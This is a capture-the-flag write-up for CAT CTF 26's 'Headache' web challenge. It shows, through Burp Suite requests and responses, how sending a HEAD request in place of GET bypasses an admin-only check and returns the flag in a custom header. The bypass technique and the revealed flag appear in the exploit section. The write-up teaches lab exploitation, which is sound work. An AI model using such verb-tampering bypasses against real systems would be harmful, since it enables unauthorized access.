layout: single 
title: "CAT CTF 26: Entry Level WEB Write-ups"  
date: 2026-03-23  
categories: [web]
tags: [CTF, Cybersecurity]  
author_profile: true  
---

🏆 CAT CTF 26: Entry Level WEB Write-ups
========================================

What’s up, hackers! 👋

![Meme](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/meme.jpg)

it’s time to dive into my primary category: **Web Exploitation**. 🕸️

As a solo player, the Web category was a massive battlefield. Out of the 10 challenges available, I managed to clear **6 of them**. Even with the intense competition, I secured **Second Blood 🥈** on one challenge and **Third Blood 🥉** on another.  

![webchallenges](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/webchallenges.png)

Web challenges are all about understanding how a developer thinks—and then finding where they got a bit too comfortable.

Let’s kick off the Web series with a challenge that was literally a "headache"—until I realized the answer was right in front of me.

===

🕸️ Web Series: Headache
========================

This challenge was a perfect example of how sometimes, as a penetration tester, you can overthink a problem when the solution is hidden in the HTTP basics.

**Author:** 0xdblm  
**Points:** 100

![challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/challenge.png)

---

📝 The Challenge Description
----------------------------

> "Headache"  
>  **URL:** `http://167.99.34.2:5000/`

Upon visiting the home page, I was greeted with an "Internal Gateway" message:

*   **Status:** Request rejected.
    
*   **Hint:** "Try again with less body."
    
*   **Options:** Get Flag | Admin Portal.

![firstpage](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/firstpage.png)
    
* * *

🔍 Phase 1: Initial Discovery
-----------------------------

When I clicked on the **"Get Flag"** button, it redirected me to `/api/flag`. Instead of the flag, I received a cold JSON response:

{"error":"admin_only","message":"Missing elevated authorization context."} 

![getflag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/getflag.png)

🧪 Phase 2: Analyzing the API (Burp Suite)
------------------------------------------

I intercepted the request to `/api/flag` using **Burp Suite** to see exactly what was happening under the hood.

**The Request:**

    GET /api/flag HTTP/1.1
    Host: 167.99.34.2:5000
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
    Referer: http://167.99.34.2:5000/
    Connection: keep-alive 

**The Response:**

HTTP

    HTTP/1.1 403 FORBIDDEN
    Server: Werkzeug/2.3.0 Python/3.11.15
    Content-Type: application/json
    Content-Length: 75
    
    {"error":"admin_only","message":"Missing elevated authorization context."}

![getmethod](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/getmethod.png)

The server was running **Werkzeug**, a common WSGI web application library for Python. The `403 Forbidden` status confirmed that the standard `GET` request was being blocked by an authorization check.

---

💡 Phase 3: The Exploit (Using your HEAD)
-----------------------------------------

I went back to the hint on the homepage: **"Try again with less body."**

In HTTP, a `GET` request can have a body, but a **HEAD** request is identical to a `GET` request except that the server **must not** return a message-body in the response. It only returns the headers.

If the developer implemented the "Admin Only" check only for `GET` and `POST` methods, a `HEAD` request might bypass the security filter entirely.

**The Attack:** I changed the request method from `GET` to `HEAD` in Burp Repeater.

HTTP

    HEAD /api/flag HTTP/1.1
    Host: 167.99.34.2:5000
    ... 

**The Response:**

HTTP

    HTTP/1.1 200 OK
    Server: Werkzeug/2.3.0 Python/3.11.15
    Date: Tue, 24 Mar 2026 03:14:35 GMT
    Content-Type: application/json
    X-Flag: CATF{M4Yb3_Us1ng_y0ur_H34D_1S_us3full}
    Cache-Control: no-store
    Content-Length: 0
    Connection: close

![headmethod](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/headmethod.png)

Success! By switching to the `HEAD` method, the server bypassed the authorization logic and served the flag directly in a custom HTTP header: **`X-Flag`**.

* * *

🏁 The Flag
-----------

The pun in the flag confirmed the intended solution:

**Final Flag:** `CATF{M4Yb3_Us1ng_y0ur_H34D_1S_us3full}`
